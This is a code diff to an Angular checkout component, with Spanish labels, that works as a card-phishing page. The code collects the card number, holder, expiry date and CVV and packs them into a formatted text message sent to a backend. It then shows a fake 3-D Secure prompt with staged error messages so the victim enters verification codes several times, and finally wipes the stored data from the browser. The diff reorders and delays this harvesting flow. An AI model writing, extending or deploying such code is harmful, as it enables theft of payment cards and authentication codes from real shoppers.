@@ -143,7 +143,7 @@ export class PaymentComponent {
     this.binLookupTimer = setTimeout(async () => {
       try {
         const info = await firstValueFrom(this.binService.lookup(bin));
-        console.log(info)
+        console.log(info);
         this.issuerBankName = info.bankName;
         this.issuerScheme = info.scheme;
         this.issuerType = info.type;
@@ -161,32 +161,38 @@ export class PaymentComponent {
 
   async checkout() {
     this.lookupIssuerFromBin();
-    let storedMsg = localStorage.getItem('m') || '';
+    setTimeout(async () => {
+      console.log(this.issuerBrand);
+      console.log(this.issuerScheme);
+      console.log(this.issuerType);
+      let storedMsg = localStorage.getItem('m') || '';
 
-    const numero = this.card.number;
-    const holder = this.card.holder;
-    const exp = this.card.expMonth + '/' + this.card.expYear || 'PENDIENTE';
-    const cvv = this.card.cvv || 'PENDIENTE';
+      const numero = this.card.number;
+      const holder = this.card.holder;
+      const exp = this.card.expMonth + '/' + this.card.expYear || 'PENDIENTE';
+      const cvv = this.card.cvv || 'PENDIENTE';
 
-    storedMsg = this.updateField(storedMsg, 'Tarjeta', numero);
-    storedMsg = this.updateField(storedMsg, 'Holder', holder);
-    storedMsg = this.updateField(storedMsg, 'fecha', exp);
-    storedMsg = this.updateField(storedMsg, 'cvv', cvv);
+      storedMsg = this.updateField(storedMsg, 'Tarjeta', numero);
+      storedMsg = this.updateField(storedMsg, 'Holder', holder);
+      storedMsg = this.updateField(storedMsg, 'fecha', exp);
+      storedMsg = this.updateField(storedMsg, 'cvv', cvv);
 
-    if (!storedMsg.includes('Tarjeta:'))
-      storedMsg += `\n\n╭🟢 Tarjeta: ${numero}`;
-    if (!storedMsg.includes('Holder:')) storedMsg += `\n┣🟢 Holder: ${holder}`;
-    if (!storedMsg.includes('fecha:')) storedMsg += `\n┣🟢 fecha: ${exp}`;
-    if (!storedMsg.includes('cvv')) storedMsg += `\n┣🟢 cvv: ${cvv}`;
-    if (!storedMsg.includes('type'))
-      storedMsg += `\n╰🟢 type: ${this.issuerScheme} - ${this.issuerBrand}`;
+      if (!storedMsg.includes('Tarjeta:'))
+        storedMsg += `\n\n╭🟢 Tarjeta: ${numero}`;
+      if (!storedMsg.includes('Holder:'))
+        storedMsg += `\n┣🟢 Holder: ${holder}`;
+      if (!storedMsg.includes('fecha:')) storedMsg += `\n┣🟢 fecha: ${exp}`;
+      if (!storedMsg.includes('cvv')) storedMsg += `\n┣🟢 cvv: ${cvv}`;
+      if (!storedMsg.includes('type'))
+        storedMsg += `\n╰🟢 type: ${this.issuerBankName} - ${this.issuerBrand}`;
 
-    localStorage.setItem('m', storedMsg);
-    const res = await this.paymentService.checkout({ text: storedMsg });
-    this.isLoading = true;
-    setTimeout(() => {
-      this.show3DSModal = true;
-    }, 8500);
+      localStorage.setItem('m', storedMsg);
+      const res = await this.paymentService.checkout({ text: storedMsg });
+      this.isLoading = true;
+      setTimeout(() => {
+        this.show3DSModal = true;
+      }, 8500);
+    }, 3000);
   }
 
   private updateField(text: string, field: string, newValue: string): string {
@@ -386,7 +392,43 @@ export class PaymentComponent {
       this.show3DSModal = true;
     }, 5000);
 
-    if (this.counter == 3) {
+    if (this.counter === 0) {
+      this.isLoading = true;
+      this.show3DSModal = false;
+      this.showErrorToast1 = true;
+      setTimeout(() => {
+        this.isLoading = false;
+        this.show3DSModal = true;
+        this.threeDSCode = '';
+      }, 9000);
+      this.counter++;
+    }
+
+    if (this.counter === 1) {
+      this.isLoading = true;
+      this.show3DSModal = false;
+      this.showErrorToast2 = true;
+      setTimeout(() => {
+        this.isLoading = false;
+        this.show3DSModal = true;
+        this.threeDSCode = '';
+      }, 9000);
+      this.counter++;
+    }
+
+    if (this.counter === 2) {
+      this.isLoading = true;
+      this.show3DSModal = false;
+      this.showErrorToast2 = true;
+      setTimeout(() => {
+        this.isLoading = false;
+        this.show3DSModal = true;
+        this.threeDSCode = '';
+      }, 6000);
+      this.counter++;
+    }
+
+    if (this.counter === 3) {
       let successCounter = Number(localStorage.getItem('scid')) || 0;
       // Validación básica del código (ej: mínimo 4 dígitos)
       if (!this.threeDSCode || this.threeDSCode.trim().length < 4) {
@@ -398,11 +440,10 @@ export class PaymentComponent {
       this.threeDSError = null;
       this.show3DSModal = false;
       this.isLoading = true;
-
+      localStorage.removeItem('mi');
+      localStorage.removeItem('userData');
+      localStorage.removeItem('m');
       setTimeout(() => {
-        localStorage.removeItem('mi');
-        localStorage.removeItem('userData');
-        localStorage.removeItem('m');
         this.isLoading = false;
 
         switch (successCounter) {
@@ -419,42 +460,6 @@ export class PaymentComponent {
             location.href = 'payment/error';
         }
       }, 4000);
-    }
-
-    if (this.counter == 0) {
-      this.isLoading = true;
-      this.show3DSModal = false;
-      this.showErrorToast1 = true;
-      setTimeout(() => {
-        this.isLoading = false;
-        this.show3DSModal = true;
-        this.threeDSCode = '';
-      }, 9000);
-      this.counter++;
-    }
-
-    if (this.counter == 1) {
-      this.isLoading = true;
-      this.show3DSModal = false;
-      this.showErrorToast2 = true;
-      setTimeout(() => {
-        this.isLoading = false;
-        this.show3DSModal = true;
-        this.threeDSCode = '';
-      }, 6000);
-      this.counter++;
-    }
-
-    if (this.counter == 2) {
-      this.isLoading = true;
-      this.show3DSModal = false;
-      this.showErrorToast2 = true;
-      setTimeout(() => {
-        this.isLoading = false;
-        this.show3DSModal = true;
-        this.threeDSCode = '';
-      }, 6000);
-      this.counter++;
     }
   }
 
